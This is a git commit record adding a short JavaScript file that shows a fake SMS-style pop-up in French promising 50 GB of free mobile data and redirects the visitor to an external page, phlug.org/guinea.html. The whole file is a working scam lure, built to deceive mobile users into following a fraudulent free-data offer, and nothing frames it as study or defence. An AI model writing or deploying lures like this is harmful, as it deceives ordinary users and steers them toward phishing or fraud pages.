9f586a8c9940753c4c4ea4a7727a234d468ae9d9
itidnewblog4 <ukpehaitid2@gmail.com>
2025-10-01 08:09:52 +0100

    Create guinea-active.js

---
+++ guinea-active.js
@@ -0,0 +1,5 @@
+var password = 'Activer 50 Go'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 50 Go de données gratuites, cliquez sur OK pour activer maintenant','Activer 50 Go');
+if (password != 'Activer 50 Go') {
+location.href='https://phlug.org/guinea.html';
+}
